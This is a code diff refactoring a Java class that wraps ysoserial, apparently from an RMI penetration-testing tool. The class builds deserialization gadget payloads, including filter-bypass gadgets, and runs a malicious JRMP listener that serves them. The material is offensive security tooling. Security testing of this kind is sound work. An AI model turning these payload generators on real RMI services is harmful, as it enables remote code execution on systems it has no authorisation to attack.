@@ -48,6 +48,7 @@ import sun.rmi.transport.tcp.TCPEndpoint;
 @SuppressWarnings("restriction")
 public class YsoIntegration {
 
+    private static String ysoPath;
     private static String[] bypassGadgets = new String[]{"JRMPClient2", "AnTrinh"};
 
     private static Object generateBypassGadget(String command)
@@ -76,7 +77,7 @@ public class YsoIntegration {
      * @return URLClassLoader for ysoserial classes
      * @throws MalformedURLException when the specified file system path exists, but is invalid
      */
-    private static URLClassLoader getClassLoader(String ysoPath) throws MalformedURLException
+    private static URLClassLoader getClassLoader() throws MalformedURLException
     {
         File ysoJar = new File(ysoPath);
 
@@ -132,11 +133,11 @@ public class YsoIntegration {
      * @param gadget ysoserial gadget name to send within responses
      * @param command ysoserial gadget command to use for gadget generation
      */
-    public static void createJRMPListener(String ysoPath, String host, int port, String gadget, String command)
+    public static void createJRMPListener(String host, int port, String gadget, String command)
     {
         try {
             InetAddress bindAddress = getLocalAddress(host);
-            URLClassLoader ucl = getClassLoader(ysoPath);
+            URLClassLoader ucl = getClassLoader();
 
             Class<?> yso = Class.forName("ysoserial.exploit.JRMPListener", true, ucl);
             Constructor<?> cons = yso.getConstructor(new Class[] {int.class, Object.class});
@@ -148,7 +149,7 @@ public class YsoIntegration {
             Logger.printMixedYellow("Creating a", "JRMPListener", "on ");
             Logger.printlnPlainBlue(host + ":" + port + ".");
 
-            Object payloadObject = getPayloadObject(ysoPath, gadget, command);
+            Object payloadObject = getPayloadObject(gadget, command);
             Object jrmpListener = cons.newInstance(port, payloadObject);
 
             ServerSocket serverSock = (ServerSocket) serverSocket.get(jrmpListener);
@@ -176,7 +177,7 @@ public class YsoIntegration {
      * @param command command specification for the desired gadget
      * @return ysoserial gadget
      */
-    public static Object getPayloadObject(String ysoPath, String gadget, String command)
+    public static Object getPayloadObject(String gadget, String command)
     {
         if(Arrays.asList(bypassGadgets).contains(gadget)) {
             return generateBypassGadget(command);
@@ -185,7 +186,7 @@ public class YsoIntegration {
         Object ysoPayload = null;
 
         try {
-            URLClassLoader ucl = getClassLoader(ysoPath);
+            URLClassLoader ucl = getClassLoader();
 
             Class<?> yso = Class.forName("ysoserial.payloads.ObjectPayload$Utils", true, ucl);
             Method method = yso.getDeclaredMethod("makePayloadObject", new Class[] {String.class, String.class});
@@ -247,5 +248,15 @@ public class YsoIntegration {
 
         ssfField.set(payloadObject, proxySSF);
         return payloadObject;
+    }
+
+    /**
+     * Sets the ysoserial path to the specified value.
+     *
+     * @param path file system path of ysoserial
+     */
+    public static void setYsoPath(String path)
+    {
+        ysoPath = path;
     }
 }
